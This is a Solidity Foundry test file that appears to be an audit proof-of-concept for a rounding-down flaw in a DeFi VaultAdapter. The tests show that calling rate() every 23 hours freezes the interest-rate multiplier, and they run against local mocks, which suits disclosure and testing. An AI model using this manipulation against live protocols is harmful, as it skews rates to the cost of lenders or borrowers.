// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.28;

import { Test } from "forge-std/Test.sol";
import { console } from "forge-std/console.sol";
import { VaultAdapter } from "../../contracts/oracle/libraries/VaultAdapter.sol";
import { IVaultAdapter } from "../../contracts/interfaces/IVaultAdapter.sol";
import { IVault } from "../../contracts/interfaces/IVault.sol";
import { AccessControl } from "../../contracts/access/AccessControl.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

/**
 * @title ExploitTest
 * @notice PoC demonstrating the rounding down vulnerability in VaultAdapter's multiplier calculation
 *
 * VULNERABILITY DESCRIPTION:
 * The VaultAdapter contract calculates interest rate multipliers based on vault utilization.
 * When utilization is above the kink, the multiplier should increase.
 * When utilization is below the kink, the multiplier should decrease.
 *
 * However, due to a rounding issue in the calculation:
 *   (_elapsed * $.rate / 1e27)
 *
 * If the oracle is consulted frequently (small _elapsed), this term rounds down to 0,
 * causing the multiplier to remain unchanged regardless of utilization.
 *
 * ATTACK SCENARIO:
 * An attacker can call the rate() function frequently to prevent multiplier shifts:
 * - During high utilization (above kink): Prevents multiplier from increasing
 * - During low utilization (below kink): Prevents multiplier from decreasing
 *
 * This allows manipulation of the interest rate calculation.
 */
contract ExploitTest is Test {
    VaultAdapter vaultAdapter;
    AccessControl accessControl;
    MockVault mockVault;
    address asset;
    address attacker;

    // Test parameters
    uint256 constant MAX_MULTIPLIER = 3e27;
    uint256 constant MIN_MULTIPLIER = 0.5e27;
    uint256 constant KINK = 0.8e27; // 80% utilization kink
    // Rate configured for 24 hour full shift: 1e27 / 86400 = 11574074074074074074074
    uint256 constant RATE = 11574074074074074074074;

    function setUp() public {
        attacker = makeAddr("attacker");
        asset = makeAddr("asset");

        // Deploy AccessControl
        AccessControl accessControlImpl = new AccessControl();
        bytes memory accessControlData = abi.encodeWithSelector(
            AccessControl.initialize.selector,
            address(this)
        );
        ERC1967Proxy accessControlProxy = new ERC1967Proxy(
            address(accessControlImpl),
            accessControlData
        );
        accessControl = AccessControl(address(accessControlProxy));

        // Deploy VaultAdapter
        VaultAdapter vaultAdapterImpl = new VaultAdapter();
        bytes memory vaultAdapterData = abi.encodeWithSelector(
            VaultAdapter.initialize.selector,
            address(accessControl)
        );
        ERC1967Proxy vaultAdapterProxy = new ERC1967Proxy(
            address(vaultAdapterImpl),
            vaultAdapterData
        );
        vaultAdapter = VaultAdapter(address(vaultAdapterProxy));

        // Deploy mock vault
        mockVault = new MockVault();

        // Configure VaultAdapter
        _setupVaultAdapter();
    }

    function _setupVaultAdapter() internal {
        // Grant access to set slopes and limits
        accessControl.grantAccess(
            vaultAdapter.setSlopes.selector,
            address(vaultAdapter),
            address(this)
        );
        accessControl.grantAccess(
            vaultAdapter.setLimits.selector,
            address(vaultAdapter),
            address(this)
        );

        // Set slopes for the asset
        IVaultAdapter.SlopeData memory slopes = IVaultAdapter.SlopeData({
            kink: KINK,
            slope0: 0.05e27, // 5% base rate
            slope1: 0.5e27   // 50% rate above kink
        });
        vaultAdapter.setSlopes(asset, slopes);

        // Set limits
        vaultAdapter.setLimits(MAX_MULTIPLIER, MIN_MULTIPLIER, RATE);

        // Initialize multiplier to 1e27 (100%)
        _setMultiplier(address(mockVault), asset, 1e27);
    }

    /**
     * @notice Test demonstrating the vulnerability when utilization is ABOVE kink
     *
     * EXPECTED BEHAVIOR:
     * When utilization is above kink (e.g., 90%), the multiplier should INCREASE over time.
     * After 24 hours at high utilization, the multiplier should be significantly higher.
     *
     * ACTUAL BEHAVIOR (VULNERABILITY):
     * By calling rate() every 23 hours, the attacker prevents the multiplier from increasing
     * because (_elapsed * $.rate / 1e27) rounds down to 0.
     *
     * IMPACT:
     * Interest rates remain artificially low during high utilization periods,
     * harming lenders and potentially destabilizing the protocol.
     */
    function test_exploit_prevent_multiplier_increase_above_kink() public {
        // First, demonstrate what SHOULD happen without the attack
        // Setup: High utilization (90%, above the 80% kink)
        uint256 highUtilization = 0.9e27;
        mockVault.setUtilization(asset, highUtilization);
        mockVault.setCurrentUtilizationIndex(asset, 0);

        vm.warp(1000);
        vaultAdapter.rate(address(mockVault), asset);

        uint256 initialMultiplier = _getMultiplier(address(mockVault), asset);
        console.log("Initial multiplier:", initialMultiplier);

        // Wait full 7 days and call once
        vm.warp(block.timestamp + 7 days);
        uint256 finalIndex = mockVault.currentUtilizationIndex(asset) + (highUtilization * 7 days);
        mockVault.setCurrentUtilizationIndex(asset, finalIndex);
        vaultAdapter.rate(address(mockVault), asset);

        uint256 multiplierWithoutAttack = _getMultiplier(address(mockVault), asset);
        console.log("Multiplier after 7 days without attack:", multiplierWithoutAttack);

        // Now demonstrate the attack
        // Reset and simulate frequent calls
        _setupVaultAdapter(); // Reset state
        mockVault.setUtilization(asset, highUtilization);
        mockVault.setCurrentUtilizationIndex(asset, 0);

        vm.warp(1000);
        vaultAdapter.rate(address(mockVault), asset);

        // Simulate 7 days passing with attacker calling rate() every 23 hours
        // This prevents the multiplier from increasing
        uint256 callInterval = 23 hours;
        uint256 totalDuration = 7 days;
        uint256 numCalls = totalDuration / callInterval;

        for (uint256 i = 0; i < numCalls; i++) {
            vm.warp(block.timestamp + callInterval);

            // Update the utilization index to simulate time passing
            uint256 indexUpdate = mockVault.currentUtilizationIndex(asset) + (highUtilization * callInterval);
            mockVault.setCurrentUtilizationIndex(asset, indexUpdate);

            // Attacker calls rate() to prevent multiplier increase
            vm.prank(attacker);
            vaultAdapter.rate(address(mockVault), asset);
        }

        uint256 multiplierAfterAttack = _getMultiplier(address(mockVault), asset);
        console.log("Multiplier after 7 days of frequent calls:", multiplierAfterAttack);

        // VULNERABILITY PROOF:
        // The multiplier should increase significantly over 7 days at high utilization
        // But with frequent calls, it barely changes
        assertLt(
            multiplierAfterAttack,
            multiplierWithoutAttack,
            "Vulnerability: Frequent calls prevent multiplier increase"
        );

        // The difference should be substantial (at least 5% difference)
        uint256 difference = multiplierWithoutAttack - multiplierAfterAttack;
        assertGt(
            difference,
            multiplierWithoutAttack / 20,
            "Vulnerability: Multiplier manipulation is significant"
        );
    }

    /**
     * @notice Test demonstrating the root cause: rounding down to zero
     *
     * This test directly shows that when _elapsed is small enough,
     * the term (_elapsed * $.rate / 1e27) rounds down to 0.
     */
    function test_root_cause_rounding_down_to_zero() public {
        // With RATE = 11574074074074074074074 (configured for 24 hour shift)
        // If _elapsed = 23 hours = 82800 seconds
        // Then: (_elapsed * RATE / 1e27) = (82800 * 11574074074074074074074) / 1e27
        //     = 958333333333333333333312 / 1e27
        //     = 0 (rounds down!)

        uint256 elapsed = 23 hours;
        uint256 calculation = (elapsed * RATE) / 1e27;

        console.log("Elapsed time (23 hours):", elapsed);
        console.log("Rate:", RATE);
        console.log("Result of (elapsed * rate / 1e27):", calculation);

        // VULNERABILITY PROOF: The calculation rounds down to 0
        assertEq(calculation, 0, "Root cause: Rounding down to zero");

        // This means the multiplier adjustment term becomes:
        // - For above kink: (1e27 + 0) = 1e27 (no change!)
        // - For below kink: (1e27 + 0) = 1e27 (no change!)
        // Therefore, the multiplier doesn't shift at all when called frequently.
    }

    /**
     * @notice Test demonstrating the vulnerability when utilization is BELOW kink
     *
     * EXPECTED BEHAVIOR:
     * When utilization is below kink (e.g., 50%), the multiplier should DECREASE over time.
     *
     * ACTUAL BEHAVIOR (VULNERABILITY):
     * By calling rate() frequently, the attacker prevents the multiplier from decreasing.
     *
     * IMPACT:
     * Interest rates remain artificially high during low utilization periods,
     * harming borrowers and making the protocol uncompetitive.
     */
    function test_exploit_prevent_multiplier_decrease_below_kink() public {
        // Setup: Start with high multiplier
        uint256 highUtilization = 0.9e27;
        mockVault.setUtilization(asset, highUtilization);
        mockVault.setCurrentUtilizationIndex(asset, 0);

        // Initialize and increase multiplier first
        vm.warp(1000);
        vaultAdapter.rate(address(mockVault), asset);

        // Wait to increase multiplier
        vm.warp(block.timestamp + 3 days);
        uint256 newIndex = mockVault.currentUtilizationIndex(asset) + (highUtilization * 3 days);
        mockVault.setCurrentUtilizationIndex(asset, newIndex);
        vaultAdapter.rate(address(mockVault), asset);

        uint256 highMultiplier = _getMultiplier(address(mockVault), asset);
        console.log("High multiplier achieved:", highMultiplier);

        // Now drop utilization below kink
        uint256 lowUtilization = 0.5e27; // 50%, below 80% kink
        mockVault.setUtilization(asset, lowUtilization);

        // Attack: Call rate() every 23 hours to prevent decrease
        uint256 callInterval = 23 hours;
        uint256 totalDuration = 7 days;
        uint256 numCalls = totalDuration / callInterval;

        for (uint256 i = 0; i < numCalls; i++) {
            vm.warp(block.timestamp + callInterval);

            uint256 indexUpdate2 = mockVault.currentUtilizationIndex(asset) + (lowUtilization * callInterval);
            mockVault.setCurrentUtilizationIndex(asset, indexUpdate2);

            vm.prank(attacker);
            vaultAdapter.rate(address(mockVault), asset);
        }

        uint256 multiplierAfterAttack = _getMultiplier(address(mockVault), asset);
        console.log("Multiplier after attack (should have decreased):", multiplierAfterAttack);

        // Compare with normal behavior (single call after 7 days)
        // Reset to high multiplier state
        _setupVaultAdapter();
        mockVault.setUtilization(asset, highUtilization);
        mockVault.setCurrentUtilizationIndex(asset, 0);

        vm.warp(1000);
        vaultAdapter.rate(address(mockVault), asset);
        vm.warp(block.timestamp + 3 days);
        newIndex = mockVault.currentUtilizationIndex(asset) + (highUtilization * 3 days);
        mockVault.setCurrentUtilizationIndex(asset, newIndex);
        vaultAdapter.rate(address(mockVault), asset);

        // Drop utilization and wait 7 days
        mockVault.setUtilization(asset, lowUtilization);
        vm.warp(block.timestamp + 7 days);
        uint256 finalIndex2 = mockVault.currentUtilizationIndex(asset) + (lowUtilization * 7 days);
        mockVault.setCurrentUtilizationIndex(asset, finalIndex2);
        vaultAdapter.rate(address(mockVault), asset);

        uint256 multiplierWithoutAttack = _getMultiplier(address(mockVault), asset);
        console.log("Multiplier without attack (properly decreased):", multiplierWithoutAttack);

        // VULNERABILITY PROOF:
        // The multiplier should decrease at low utilization
        // But with frequent calls, it stays higher
        assertGt(
            multiplierAfterAttack,
            multiplierWithoutAttack,
            "Vulnerability: Frequent calls prevent multiplier decrease"
        );
    }

    /**
     * @notice Helper function to read multiplier from storage
     * Uses the storage slot calculation from VaultAdapterStorageUtils
     */
    function _getMultiplier(address vault, address _asset) internal view returns (uint256) {
        // Storage location from VaultAdapterStorageUtils
        bytes32 storageLocation = 0x2b1d5d801322d1007f654ac87d8072a5f5ca4203517edc869ef2aa54addad600;

        // utilizationData is at offset 1 in VaultAdapterStorage (after slopeData mapping)
        // utilizationData[vault][asset].multiplier is the first field
        bytes32 slot = keccak256(abi.encode(_asset, keccak256(abi.encode(vault, uint256(storageLocation) + 1))));

        return uint256(vm.load(address(vaultAdapter), slot));
    }

    /**
     * @notice Helper function to set multiplier in storage
     */
    function _setMultiplier(address vault, address _asset, uint256 value) internal {
        // Storage location from VaultAdapterStorageUtils
        bytes32 storageLocation = 0x2b1d5d801322d1007f654ac87d8072a5f5ca4203517edc869ef2aa54addad600;

        // utilizationData is at offset 1 in VaultAdapterStorage (after slopeData mapping)
        // utilizationData[vault][asset].multiplier is the first field
        bytes32 slot = keccak256(abi.encode(_asset, keccak256(abi.encode(vault, uint256(storageLocation) + 1))));

        vm.store(address(vaultAdapter), slot, bytes32(value));
    }
}

/**
 * @notice Mock Vault contract for testing
 * Simulates the IVault interface methods needed by VaultAdapter
 */
contract MockVault {
    mapping(address => uint256) private _utilization;
    mapping(address => uint256) private _utilizationIndex;

    function setUtilization(address asset, uint256 util) external {
        _utilization[asset] = util;
    }

    function setCurrentUtilizationIndex(address asset, uint256 index) external {
        _utilizationIndex[asset] = index;
    }

    function utilization(address asset) external view returns (uint256) {
        return _utilization[asset];
    }

    function currentUtilizationIndex(address asset) external view returns (uint256) {
        return _utilizationIndex[asset];
    }
}
